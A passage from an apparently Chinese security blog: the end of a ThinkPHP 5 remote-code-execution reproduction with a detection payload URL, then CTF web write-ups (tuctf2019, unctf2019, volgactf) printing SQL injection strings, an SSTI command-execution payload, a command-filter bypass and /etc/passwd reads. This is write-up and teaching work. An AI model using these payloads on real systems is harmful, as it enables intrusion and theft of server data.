class="variable">$instance</span>-&gt;registerMiddleware();</span><br><span class="line">           &#125;</span><br><span class="line">       &#125; <span class="keyword">catch</span> (ClassNotFoundException <span class="variable">$e</span>) &#123;</span><br><span class="line">           <span class="keyword">throw</span> <span class="keyword">new</span> HttpException(<span class="number">404</span>, <span class="string">&#x27;controller not exists:&#x27;</span> . <span class="variable">$e</span>-&gt;getClass());</span><br><span class="line">       &#125;</span><br><span class="line">   ...</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>跟进controller</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">controller</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$layer</span> = <span class="string">&#x27;controller&#x27;</span>, <span class="variable">$appendSuffix</span> = <span class="literal">false</span>, <span class="variable">$empty</span> = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">list</span>(<span class="variable">$module</span>, <span class="variable">$class</span>) = <span class="keyword">$this</span>-&gt;parseModuleAndClass(<span class="variable">$name</span>, <span class="variable">$layer</span>, <span class="variable">$appendSuffix</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (class_exists(<span class="variable">$class</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;__get(<span class="variable">$class</span>);</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (<span class="variable">$empty</span> &amp;&amp; class_exists(<span class="variable">$emptyClass</span> = <span class="keyword">$this</span>-&gt;parseClass(<span class="variable">$module</span>, <span class="variable">$layer</span>, <span class="variable">$empty</span>, <span class="variable">$appendSuffix</span>))) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;__get(<span class="variable">$emptyClass</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> ClassNotFoundException(<span class="string">&#x27;class not exists:&#x27;</span> . <span class="variable">$class</span>, <span class="variable">$class</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>再跟进parseModuleAndClass</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parseModuleAndClass</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$layer</span>, <span class="variable">$appendSuffix</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">false</span> !== strpos(<span class="variable">$name</span>, <span class="string">&#x27;\\&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$class</span>  = <span class="variable">$name</span>;<span class="comment">//存在\</span></span><br><span class="line">            <span class="variable">$module</span> = <span class="keyword">$this</span>-&gt;request-&gt;module();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (strpos(<span class="variable">$name</span>, <span class="string">&#x27;/&#x27;</span>)) &#123;</span><br><span class="line">                <span class="keyword">list</span>(<span class="variable">$module</span>, <span class="variable">$name</span>) = explode(<span class="string">&#x27;/&#x27;</span>, <span class="variable">$name</span>, <span class="number">2</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$module</span> = <span class="keyword">$this</span>-&gt;request-&gt;module();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$class</span> = <span class="keyword">$this</span>-&gt;parseClass(<span class="variable">$module</span>, <span class="variable">$layer</span>, <span class="variable">$name</span>, <span class="variable">$appendSuffix</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [<span class="variable">$module</span>, <span class="variable">$class</span>];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>如果存在\则直接返回数据,其中<code>$name</code>是我们可控内容,而<code>$name</code>也恰好是类名,于是我们可以通过调用命名空间\类来进行敏感操作</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>查找手册,找到url访问的具体细节</p>
<p><code>http://serverName/index.php（或者其它应用入口文件）?s=/模块/控制器/操作/[参数名/参数值...]</code></p>
<p>于是有通杀tp5.0.x和tp5.1.x的检测payload</p>
<p><code>http://127.0.0.1/public/?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=var_dump&amp;vars[1][]=checktp5rce</code></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/10/01/tp5rce%E5%A4%8D%E7%8E%B0/" data-id="cku8j3fi80069dan78sewdqru" data-title="tp5rce复现" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-tuctf" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/10/01/tuctf/" class="article-date">
  <time class="dt-published" datetime="2021-10-01T15:35:42.676Z" itemprop="datePublished">2021-10-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/10/01/tuctf/">tuctf2019</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="tuctf2019"><a href="#tuctf2019" class="headerlink" title="tuctf2019"></a>tuctf2019</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="Router-Where-Art-Thou"><a href="#Router-Where-Art-Thou" class="headerlink" title="Router Where Art Thou?"></a>Router Where Art Thou?</h3><p> <a target="_blank" rel="noopener" href="http://chal.tuctf.com:30006/0.html">http://chal.tuctf.com:30006/0.html</a> </p>
<p> <a target="_blank" rel="noopener" href="http://chal.tuctf.com:30006/1.html">http://chal.tuctf.com:30006/1.html</a></p>
<p> <a target="_blank" rel="noopener" href="http://chal.tuctf.com:30006/2.html">http://chal.tuctf.com:30006/2.html</a>  </p>
<p><code>FIXME: need to use Page::includeStaticResource</code></p>
<p><code>2.html:603  hidden variables, we are going to set this to the session, bug fix 2157</code></p>
<p><a target="_blank" rel="noopener" href="https://192.168.1.254/">https://192.168.1.254/</a></p>
<p>….爆破密码获得flag</p>
<h3 id="Login-to-Access"><a href="#Login-to-Access" class="headerlink" title="Login to Access"></a>Login to Access</h3><p>当Referer不为<a target="_blank" rel="noopener" href="http://chal.tuctf.com:30001/login.html%E6%97%B6,%E5%AD%98%E5%9C%A8sql%E6%B3%A8%E5%85%A5">http://chal.tuctf.com:30001/login.html时,存在sql注入</a></p>
<p>当Referer: <a target="_blank" rel="noopener" href="http://chal.tuctf.com:30001/login.hmtl%E6%97%B6sql">http://chal.tuctf.com:30001/login.hmtl时sql</a> 注入被过滤</p>
<p>对第一种情况sql注入得到</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#database:information_schema,challenge,mysql,performance_schema,sys </span></span><br><span class="line"><span class="comment">#table:users</span></span><br><span class="line"><span class="comment">#columns:user,password,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS</span></span><br><span class="line"><span class="comment">#user,password,USER : dave,hunter2,dave</span></span><br></pre></td></tr></table></figure>



<p>利用得到的账号密码直接在第二步登陆无效,猜测第二步还要sql注入</p>
<ul>
<li>sql注入</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">dave<span class="string">&#x27;+or+1%23 x</span></span><br><span class="line"><span class="string">dave&quot;+or+1%23 x</span></span><br><span class="line"><span class="string">dave&quot;)+or+1%23 x</span></span><br><span class="line"><span class="string">dave&#x27;</span>)+<span class="keyword">or</span>+<span class="number">1</span>%<span class="number">23</span> x</span><br><span class="line">\转义<span class="string">&#x27;或&quot;来逃逸失败</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>

<p>宽字节注入:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#username=%2bsleep(10)&amp;password=%bf%5c&quot; x</span></span><br><span class="line"><span class="comment">#username=%2bsleep(10)&amp;password=%bf%5c&#x27; x</span></span><br><span class="line"><span class="comment">#username=%bf%5c&quot;&amp;password=%2bsleep(10) x</span></span><br><span class="line"><span class="comment">#username=%bf%5c&#x27;&amp;password=%2bsleep(10) x</span></span><br></pre></td></tr></table></figure>







<p>sql注入点时username还是password</p>
<p>是单引号还是双引号闭合</p>
<p>过滤了哪些字符，转义了哪些字符</p>
<p>We then looked at the challenge’s description again and realized that there might be backup of file somewhere. We then tried to get the <strong>login.php.bak</strong>.</p>
<p><img src="https://khroot.com/wp-content/uploads/2019/11/image-201.png" alt="img"></p>
<p>Surprise, there really is a backup file there. Let’s see what is inside.</p>
<p><img src="https://khroot.com/wp-content/uploads/2019/11/image-202-1024x385.png" alt="img"></p>
<p>We found the flag, and it is <code>TUCTF&#123;b4ckup5_0f_php?_1t5_m0r3_c0mm0n_th4n_y0u_th1nk&#125;</code></p>
<h3 id="The-Droid-You’re-Looking-For"><a href="#The-Droid-You’re-Looking-For" class="headerlink" title="The Droid You’re  Looking For"></a>The Droid You’re  Looking For</h3><p>看到droid想到robots.txt,直接访问提示没有权限</p>
<p>因为robots.txt是给爬虫看的,所以去百度了一个google爬虫的user-agent:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1;</span><br></pre></td></tr></table></figure>

<p>robots.txt</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: googleagentflagfoundhere.html</span><br></pre></td></tr></table></figure>

<p>TUCTF{463nt_6006l3_r3p0rt1n6_4_r0b0t}</p>
<h3 id="And-Now-For-Something-Completely-Different"><a href="#And-Now-For-Something-Completely-Different" class="headerlink" title="And Now, For Something Completely Different"></a>And Now, For Something Completely Different</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;/usr/local/lib/python2.7/dist-packages/tornado/web.py&quot;</span>, line <span class="number">1509</span>, <span class="keyword">in</span> _execute</span><br><span class="line">    result = method(*self.path_args, **self.path_kwargs)</span><br><span class="line">  File <span class="string">&quot;/usr/src/app/class_website.py&quot;</span>, line <span class="number">87</span>, <span class="keyword">in</span> post</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(name) == <span class="number">0</span> <span class="keyword">or</span> <span class="built_in">len</span>(phone_num) == <span class="number">0</span> <span class="keyword">or</span> <span class="built_in">len</span>(email) == <span class="number">0</span> <span class="keyword">or</span> <span class="built_in">len</span>(passwd2) == <span class="number">0</span> <span class="keyword">or</span> passw != passw2:</span><br><span class="line">NameError: <span class="keyword">global</span> name <span class="string">&#x27;passwd2&#x27;</span> <span class="keyword">is</span> <span class="keyword">not</span> defined</span><br></pre></td></tr></table></figure>

<p>在网页中发现</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- <span class="doctag">TODO:</span> add /welcome/test --&gt;</span></span><br></pre></td></tr></table></figure>

<p>打开只有welcome test &lt;==&gt; /welcome/test</p>
<p>猜测是ssti</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;__import__(&#x27;os&#x27;).popen(&#x27;cat flag.txt&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p> TUCTF{4lw4y5_60_5h0pp1n6_f0r_fl465} </p>
<h3 id="Cute-Animals-Company"><a href="#Cute-Animals-Company" class="headerlink" title="Cute Animals Company"></a>Cute Animals Company</h3><p>修改cookie获得登陆权限</p>
<p>sqlmap得到密码</p>
<p>file:///etc/passwd获得flag???</p>
<p>http访问都不行的呀</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/10/01/tuctf/" data-id="cku8j3fia006ddan7fl6b9a1k" data-title="tuctf2019" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-unctf2019" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/10/01/unctf2019/" class="article-date">
  <time class="dt-published" datetime="2021-10-01T15:35:42.676Z" itemprop="datePublished">2021-10-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/10/01/unctf2019/">unctf2019</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="unctf2019"><a href="#unctf2019" class="headerlink" title="unctf2019"></a>unctf2019</h1><h2 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">    <span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"> <span class="comment">// try bypass it</span></span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&quot;/\&#x27;|\&quot;|,|;|\`|\\|\*|\n|\t|\xA0|\r|\&#123;|\&#125;|\(|\)|&lt;|\&amp;[^\d]|@|\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is&quot;</span>, <span class="variable">$a</span>))</span><br><span class="line">        <span class="variable">$a</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="variable">$a</span> =<span class="string">&#x27;&quot;&#x27;</span> . <span class="variable">$a</span> . <span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&quot;/\&#x27;|\&quot;|;|,|\`|\*|\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|&lt;|\&amp;[^\d]|@|\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is&quot;</span>, <span class="variable">$b</span>))</span><br><span class="line">        <span class="variable">$b</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="variable">$b</span> = <span class="string">&#x27;&quot;&#x27;</span> . <span class="variable">$b</span> . <span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line">     <span class="variable">$cmd</span> = <span class="string">&quot;file <span class="subst">$a</span> <span class="subst">$b</span>&quot;</span>;</span><br><span class="line">      str_replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;<span class="subst">$cmd</span>&quot;</span>); </span><br><span class="line">     system(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p>用<code>a=\&amp;b=\</code>来逃脱引号</p>
<p>用?来匹配,但是隐藏文件是无法显示的要自己在前面加一个.</p>
<p><code>file &quot;\&quot; -f &quot;  \&quot;</code></p>
<p>最后在<code>http://101.71.29.5:10054/.F1jh_/h3R3_1S_your_F1A9.txt</code>里找到flag</p>
<p><code>unctf&#123;86dfe85d7c5842c5c04adae104193ee1&#125;</code></p>
<h2 id="NSB-RESET-PASSWORD"><a href="#NSB-RESET-PASSWORD" class="headerlink" title="NSB RESET PASSWORD"></a>NSB RESET PASSWORD</h2><p>题目说是重置密码,刚开始我想的是越权</p>
<p>后面搞了好久都不行。后面试着弄了一下发现一个验证码可以多次用.</p>
<p>我就猜有可能是条件竞争</p>
<p>先注册一个账号用收到的验证码重置，然后再用admin账号请求重置密码</p>
<p>然后直接跳到修改密码的界面,修改一下就出来了</p>
<p> flag{175f3098f80735ddfdfbd4588f6b1082} </p>
<h2 id="帮赵总征婚"><a href="#帮赵总征婚" class="headerlink" title="帮赵总征婚"></a>帮赵总征婚</h2><p>盲猜sql注入</p>
<p>转义:<code>&#39;,&quot;,\,#</code></p>
<p>还给了我们一个phpinfo?????</p>
<p>我也想帮赵总征婚啊，可是我没机会</p>
<p>remember_me 是否可以注入?</p>
<h2 id="inject-twice"><a href="#inject-twice" class="headerlink" title="inject twice"></a>inject twice</h2><p>题目是sql-lab的源码</p>
<p>二次注入点</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	<span class="comment"># Validating the user input........</span></span><br><span class="line">	<span class="variable">$username</span>= <span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>];</span><br><span class="line">	<span class="variable">$curr_pass</span>= mysql_real_escape_string(<span class="variable">$_POST</span>[<span class="string">&#x27;current_password&#x27;</span>]);</span><br><span class="line">	<span class="variable">$pass</span>= mysql_real_escape_string(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line">	<span class="variable">$re_pass</span>= mysql_real_escape_string(<span class="variable">$_POST</span>[<span class="string">&#x27;re_password&#x27;</span>]);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$pass</span>==<span class="variable">$re_pass</span>)</span><br><span class="line">	&#123;	</span><br><span class="line">		<span class="variable">$sql</span> = <span class="string">&quot;UPDATE users SET PASSWORD=&#x27;<span class="subst">$pass</span>&#x27; where username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$curr_pass</span>&#x27; &quot;</span>;</span><br><span class="line">		<span class="variable">$res</span> = mysql_query(<span class="variable">$sql</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;You tried to be smart, Try harder!!!! :( &#x27;</span>);</span><br><span class="line">		<span class="variable">$row</span> = mysql_affected_rows();</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&#x27;</span>;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$row</span>==<span class="number">1</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;Password successfully updated&quot;</span>;</span><br><span class="line">	</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			header(<span class="string">&#x27;Location: failed.php&#x27;</span>);</span><br><span class="line">			<span class="comment">//echo &#x27;You tried to be smart, Try harder!!!! :( &#x27;;</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&lt;center&gt;&#x27;</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;Make sure New Password and Retype Password fields have same value&quot;</span>;</span><br><span class="line">		header(<span class="string">&#x27;refresh:2, url=index.php&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p>但是得到admin账号后,并没有得到flag,估计要把数据库给溜一圈。</p>
<p>黑名单:<code>or, </code></p>
<p>注册一个<code>hello\</code>的账号,就可以用,currentpass来注入,但是环境炸了,我sleep了一下就奇奇怪怪了</p>
<p>//////////////???????????????????</p>
<p>currentpass=<code>/**/or/**/1-- a</code></p>
<p>数据库名<code> or (SELECT substr(hex(group_concat(schema_name)),1,1) FROM information_schema.schemata)=char(54)-- a</code></p>
<p>information_schema,metinfo,mysql,performance_schema,security,sys</p>
<p>表:</p>
<p><code>GROUP_CONCAT(table_name) FROM information_schema.tables WHERE TABLE_SCHEMA=database()</code></p>
<p>security:emails,fl4g,referers,uagents,users</p>
<p>列名</p>
<p>fl4g:f1ag</p>
<p>最后的flag<code> UNCTF&#123;585ae8df50433972bb6ebd76e3ebd9f4&#125;</code></p>
<h2 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h2><p>又是一个vue应用</p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8cz6r1f4pj30ep0d2wfe.jpg" alt="image.png"></p>
<p>在代码中发现</p>
<p>/calc: 可以命令执行,但是却没有办法找到有效的利用方式</p>
<p>后端是node.js</p>
<p>version: v10.12.0 </p>
<p>cwd:/usr</p>
<p>/usr目录</p>
<p> bin,games,include,lib,local,sbin,share,src </p>
<p>res.end(require(‘fs’).readFileSync(‘/etc/passwd’).toString())</p>
<p>require(‘fs’).readdirSync.(‘/etc/passwd’).toString()</p>
<p>在根目录下找到flag</p>
<p>  flag{0e4d1980ef6f8a81428f83e8e1c6e22b} </p>
<p>最后还是晚了一分钟</p>
<p>看来改天要看看nodejs的东东?</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/10/01/unctf2019/" data-id="cku8j3fib006gdan7d7ule2ge" data-title="unctf2019" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-volgactf" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/10/01/volgactf/" class="article-date">
  <time class="dt-published" datetime="2021-10-01T15:35:42.676Z" itemprop="datePublished">2021-10-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/10/01/volgactf/">volgactf</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="volgactf"><a href="#volgactf" class="headerlink" title="volgactf"></a>volgactf</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="Newsletter"><a href="#Newsletter" class="headerlink" title="Newsletter"></a>Newsletter</h3><p>源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Bundle</span>\<span class="title">FrameworkBundle</span>\<span class="title">Controller</span>\<span class="title">AbstractController</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">HttpFoundation</span>\<span class="title">Response</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">HttpFoundation</span>\<span class="title">Request</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Mailer</span>\<span class="title">MailerInterface</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Mime</span>\<span class="title">Email</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MainController</span> <span class="keyword">extends</span> <span class="title">AbstractController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params">Request <span class="variable">$request</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;render(<span class="string">&#x27;main.twig&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">subscribe</span>(<span class="params">Request <span class="variable">$request</span>, MailerInterface <span class="variable">$mailer</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">      <span class="variable">$msg</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">      <span class="variable">$email</span> = filter_var(<span class="variable">$request</span>-&gt;request-&gt;get(<span class="string">&#x27;email&#x27;</span>, <span class="string">&#x27;&#x27;</span>), FILTER_VALIDATE_EMAIL);</span><br><span class="line">      <span class="keyword">if</span>(<span class="variable">$email</span> !== <span class="literal">FALSE</span>) &#123;</span><br><span class="line">        <span class="variable">$name</span> = substr(<span class="variable">$email</span>, <span class="number">0</span>, strpos(<span class="variable">$email</span>, <span class="string">&#x27;@&#x27;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="variable">$content</span> = <span class="keyword">$this</span>-&gt;get(<span class="string">&#x27;twig&#x27;</span>)-&gt;createTemplate(</span><br><span class="line">          <span class="string">&quot;&lt;p&gt;Hello 